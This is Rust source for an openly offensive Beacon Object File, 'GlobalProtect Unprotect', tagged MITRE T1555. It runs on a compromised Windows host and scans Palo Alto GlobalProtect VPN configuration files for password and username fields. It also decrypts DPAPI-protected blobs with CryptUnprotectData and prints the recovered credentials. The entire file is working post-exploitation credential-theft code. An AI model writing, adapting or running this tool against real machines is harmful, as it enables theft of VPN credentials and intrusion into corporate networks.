//! # GlobalProtect Unprotect BOF
//!
//! Reads and decrypts GlobalProtect VPN configuration files from
//! `%ProgramData%\Palo Alto Networks\GlobalProtect\`. Searches for
//! portal/gateway config files and decrypts any DPAPI-protected values
//! using CryptUnprotectData.
//! ## MITRE ATT&CK
//! - T1555 - Credentials from Password Stores
//!
//! ## Arguments
//! - None.

#![no_std]

use alloc::vec;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, INVALID_HANDLE_VALUE};
use windows_sys::Win32::Storage::FileSystem::*;

unsafe extern "system" {
    fn ExpandEnvironmentStringsA(src: *const u8, dst: *mut u8, size: u32) -> u32;

    fn LocalFree(h_mem: *mut core::ffi::c_void) -> *mut core::ffi::c_void;
}

#[repr(C)]
struct DataBlob {
    cb_data: u32,
    pb_data: *mut u8,
}

unsafe extern "system" {
    fn CryptUnprotectData(
        p_data_in: *const DataBlob,
        pp_sz_data_descr: *mut *mut u16,
        p_optional_entropy: *const DataBlob,
        pv_reserved: *mut core::ffi::c_void,
        p_prompt_struct: *mut core::ffi::c_void,
        dw_flags: u32,
        p_data_out: *mut DataBlob,
    ) -> i32;
}

const MAX_FILE_SIZE: usize = 2 * 1024 * 1024;

const CONFIG_EXTENSIONS: &[&str] = &[".xml", ".conf", ".dat", ".cfg"];

const CRED_KEYWORDS: &[&[u8]] = &[
    b"<Password>",
    b"<UserPassword>",
    b"<Passwd>",
    b"password=",
    b"portal-prelogon",
    b"<Username>",
];

fn cstr_to_str(buf: &[u8]) -> &str {
    let len = buf.iter().position(|&b| b == 0).unwrap_or(buf.len());
    core::str::from_utf8(&buf[..len]).unwrap_or("")
}

fn read_file_contents(path: &str) -> Option<alloc::vec::Vec<u8>> {
    let mut path_buf = alloc::vec::Vec::from(path.as_bytes());
    path_buf.push(0);

    unsafe {
        let handle = CreateFileA(
            path_buf.as_ptr(),
            0x80000000, // GENERIC_READ
            FILE_SHARE_READ,
            core::ptr::null(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            core::ptr::null_mut(),
        );

        if handle == INVALID_HANDLE_VALUE {
            return None;
        }

        let mut size_high: u32 = 0;
        let size_low = GetFileSize(handle, &mut size_high);
        let file_size = (((size_high as u64) << 32) | size_low as u64) as usize;

        if file_size == 0 || file_size > MAX_FILE_SIZE {
            CloseHandle(handle);
            return None;
        }

        let mut buf = vec![0u8; file_size];
        let mut bytes_read: u32 = 0;
        let ok = ReadFile(
            handle,
            buf.as_mut_ptr() as *mut u8,
            file_size as u32,
            &mut bytes_read,
            core::ptr::null_mut(),
        );
        CloseHandle(handle);

        if ok == 0 {
            return None;
        }

        buf.truncate(bytes_read as usize);
        Some(buf)
    }
}

fn try_dpapi_decrypt(data: &[u8]) -> Option<alloc::vec::Vec<u8>> {
    let data_in = DataBlob {
        cb_data: data.len() as u32,
        pb_data: data.as_ptr() as *mut u8,
    };
    let mut data_out = DataBlob {
        cb_data: 0,
        pb_data: core::ptr::null_mut(),
    };

    let result = unsafe {
        CryptUnprotectData(
            &data_in,
            core::ptr::null_mut(),
            core::ptr::null(),
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            0,
            &mut data_out,
        )
    };

    if result == 0 {
        return None;
    }

    let decrypted = unsafe {
        core::slice::from_raw_parts(data_out.pb_data, data_out.cb_data as usize).to_vec()
    };

    unsafe {
        if !data_out.pb_data.is_null() {
            LocalFree(data_out.pb_data as *mut core::ffi::c_void);
        }
    }

    Some(decrypted)
}

fn hex_encode(data: &[u8]) -> alloc::string::String {
    use core::fmt::Write;
    let mut s = alloc::string::String::with_capacity(data.len() * 2);
    for &b in data {
        let _ = write!(s, "{:02x}", b);
    }
    s
}

fn search_credentials(data: &[u8], filename: &str) -> usize {
    let mut count = 0usize;

    for &keyword in CRED_KEYWORDS {
        if data.len() < keyword.len() {
            continue;
        }
        let mut i = 0;
        while i <= data.len() - keyword.len() {
            let matched = data[i..i + keyword.len()]
                .iter()
                .zip(keyword.iter())
                .all(|(&a, &b)| a.eq_ignore_ascii_case(&b));

            if matched {
                let line_start = data[..i]
                    .iter()
                    .rposition(|&b| b == b'\n')
                    .map(|p| p + 1)
                    .unwrap_or(0);
                let line_end = data[i..]
                    .iter()
                    .position(|&b| b == b'\n')
                    .map(|p| i + p)
                    .unwrap_or(core::cmp::min(i + 128, data.len()));
                let line = &data[line_start..line_end];
                let display: alloc::vec::Vec<u8> = line
                    .iter()
                    .map(|&b| if (0x20..0x7f).contains(&b) { b } else { b'.' })
                    .collect();
                if let Ok(s) = core::str::from_utf8(&display) {
                    println!("  [{}] {}", filename, s.trim());
                    count += 1;
                }
                i += keyword.len();
            } else {
                i += 1;
            }
        }
    }
    count
}

fn has_config_extension(name: &str) -> bool {
    let lower: alloc::string::String = name.chars().map(|c| c.to_ascii_lowercase()).collect();
    for &ext in CONFIG_EXTENSIONS {
        if lower.ends_with(ext) {
            return true;
        }
    }
    !lower.contains('.')
}

#[rustbof::main]
fn main(_args: *mut u8, _len: usize) {
    println!("global_unprotect: Reading GlobalProtect VPN config files");

    let env_path = b"%ProgramData%\\Palo Alto Networks\\GlobalProtect\\*\0";
    let mut expanded = [0u8; 512];
    let result = unsafe {
        ExpandEnvironmentStringsA(
            env_path.as_ptr(),
            expanded.as_mut_ptr(),
            expanded.len() as u32,
        )
    };

    if result == 0 {
        eprintln!(
            "Failed to expand environment string (error {:#X})",
            unsafe { GetLastError() }
        );
        return;
    }

    let search_path = cstr_to_str(&expanded);
    println!("  Searching: {}", search_path);

    let dir_prefix = &search_path[..search_path.len() - 1];

    unsafe {
        let mut fd: WIN32_FIND_DATAA = core::mem::zeroed();
        let handle = FindFirstFileA(expanded.as_ptr(), &mut fd);

        if handle == INVALID_HANDLE_VALUE {
            let err = GetLastError();
            if err == 2 || err == 3 {
                println!("GlobalProtect config directory not found.");
            } else {
                eprintln!("FindFirstFileA failed (error {:#X})", err);
            }
            return;
        }

        let mut total_found: usize = 0;
        let mut files_checked: u32 = 0;

        loop {
            let name_bytes = core::slice::from_raw_parts(fd.cFileName.as_ptr() as *const u8, 260);
            let name = cstr_to_str(name_bytes);

            if fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY == 0
                && !name.is_empty()
                && has_config_extension(name)
            {
                let mut full_path = alloc::string::String::from(dir_prefix);
                full_path.push_str(name);

                println!("  Reading: {}", name);

                if let Some(data) = read_file_contents(&full_path) {
                    let found = search_credentials(&data, name);
                    total_found += found;

                    if data.len() > 4 && data[0..2] == [0x01, 0x00] {
                        println!("  Attempting DPAPI decryption on {}...", name);
                        if let Some(decrypted) = try_dpapi_decrypt(&data) {
                            if decrypted
                                .iter()
                                .all(|&b| (0x20..0x7f).contains(&b) || b == b'\n' || b == b'\r')
                            {
                                if let Ok(s) = core::str::from_utf8(&decrypted) {
                                    println!("  Decrypted ({}): {}", name, s);
                                }
                            } else {
                                println!(
                                    "  Decrypted {} ({} bytes): {}",
                                    name,
                                    decrypted.len(),
                                    hex_encode(&decrypted[..core::cmp::min(64, decrypted.len())])
                                );
                            }
                            total_found += 1;
                        }
                    }
                }
                files_checked += 1;
            }

            if FindNextFileA(handle, &mut fd) == 0 {
                break;
            }
        }

        FindClose(handle);

        println!(
            "Checked {} config files, found {} credential artifact(s)",
            files_checked, total_found
        );
        if total_found > 0 {
            println!("SUCCESS.");
        } else {
            println!("No credentials found in GlobalProtect config files.");
        }
    }
}
